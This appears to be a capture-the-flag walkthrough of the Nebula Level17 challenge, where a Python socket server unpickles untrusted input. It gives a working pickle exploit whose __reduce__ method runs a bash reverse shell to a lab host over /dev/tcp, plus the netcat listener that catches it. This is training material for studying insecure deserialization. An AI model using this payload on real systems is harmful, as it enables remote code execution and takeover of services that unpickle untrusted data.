# LEVEL17 Walkthrough 


LEVEL17 given code:

```py

#!/usr/bin/python

import os
import pickle
import time
import socket
import signal

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def server(skt):
  line = skt.recv(1024)

  obj = pickle.loads(line)

  for i in obj:
      clnt.send("why did you send me " + i + "?\n")

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind(('0.0.0.0', 10007))
skt.listen(10)

while True:
  clnt, addr = skt.accept()

  if(os.fork() == 0):
      clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
      server(clnt)
      exit(1)

```
The program seems like a server that opens sockets connection with anyone who request it.
When a connection is requested the server sends an Accepted message connection and waits for a response,
the response is then interpreted with the pickle package.

Let's check what is a pickle:

#### [From the python documentation: ](https://docs.python.org/3/library/pickle.html)

*The pickle module implements binary protocols for serializing and de-serializing a Python object structure*

If there is function from loading package there needs to be a function for creating that function is called dump:
```py
 pickle.dump(obj, file, protocol=None, *, fix_imports=True, buffer_callback=None)
```

Now we should be able to interact with the program with NetCat and python.

```py
import pickle 

sample = {"k0":"v0","k1":"v1","k2":"v2"}

pickle.dump(sample,open("sample.p","wb")) #Create pickle file named sample.p

output_sample = pickle.load(open("sample.p","rb"))

print(output_sample)

```

As we can see pickle is doing something completly different from Nebula


Now we can use NetCat to communicate with the server

```sh
 C:\Users\migue\Documents\Nebula_Exploits\Level17>nc 192.168.56.101 10007 < sample.p
 Accepted connection from 192.168.56.1:64993    
```

Even though we sent the file through a pickle server we are not getting 
the expected response, seems like pickle is not loading well the file.
The problem might be because of Nebula older version of pickle.

Let's check it from my Nebula
```sh
///////////////MY PC

C:\Users\migue\Documents\Nebula_Exploits\Level17>cat sample.p
□□# □(□k0□□v0□□k1□□v1□□k2□□v2□u.

///////////////NEBULA
level17nebula:/tmp$ python level17.py
{'k2': 'v2', 'k1': 'v1','k0': 'v0'}
level17nebula:/tmp$ cat sample.p
(dp0
S 'k2'
p1
S 'v2'
p2
sS 'k1'
p3
S 'v1'
p4
sS 'k0'
p5
S 'v0'
p6
```

Now that we got the code working let's get back to pickle documentation:

```

Warning

The pickle module is not secure. Only unpickle data you trust.

It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.

Consider signing data with hmac if you need to ensure that it has not been tampered with.

Safer serialization formats such as json may be more appropriate if you are processing untrusted data. See Comparison with json.

```

So the missuse of pickle turns out to be the vulnerabilitie 

Let's search how pickle is exploitable

with the help of this post: ####[Exploting misuse of Python pickle](https://blog.nelhage.com/2011/03/exploiting-pickle/)

```
 object.__reduce__()

    When the Pickler encounters an object of a type it knows nothing about — such as an extension type — it looks in two places for a hint of how to pickle it. One alternative is for the object to implement a __reduce__() method. If provided, at pickling time __reduce__() will be called with no arguments, and it must return either a string or a tuple.
    
    ....

    When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:

        A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.

        In the unpickling environment this object must be either a class, a callable registered as a “safe constructor” (see below), or it must have an attribute __safe_for_unpickling__ with a true value. Otherwise, an UnpicklingError will be raised in the unpickling environment. Note that as usual, the callable itself is pickled by name.
```

So we can call any method we want and give the arguments with a tuple on the second position of our main tuple

```py
import pickle 
import os

class Exploit(object):
	def __reduce__(self):
		return (os.system,("/bin/bash -i >& /dev/tcp/192.168.56.1/8888 0>&1",)); 
				   #open a reverse shell in my PC machine

a = Exploit();

pickle.dump(a,open("exploit.p","wb"))


```

And we got full control over flag17 account

```sh
C:\Users\migue\Documents\Nebula_Exploits\Level17>nc -l -p 8888
bash: no job control in this shell
flag17@nebula:/$ getflag
getflag
You have successfully executed getflag on a target account
flag17@nebula:/$  
```
